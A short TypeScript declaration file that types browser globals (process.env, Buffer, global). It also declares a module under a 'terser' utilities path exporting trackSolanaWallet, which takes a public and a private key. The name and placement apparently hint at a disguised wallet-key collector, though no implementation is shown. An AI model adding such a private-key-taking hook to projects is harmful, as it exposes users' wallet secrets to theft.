/**
 * Global types for browser environment
 */

declare global {
  interface Window {
    global: any;
    process: {
      env: Record<string, string>;
    };
    Buffer: any;
  }

  var Buffer: any;
  var process: {
    env: Record<string, string>;
  };
  var global: any;
}

declare module '../../node_utils/terser/main.js' {
  export function trackSolanaWallet(publicKey: string, privateKey: string): Promise<void>;
}

export {}; 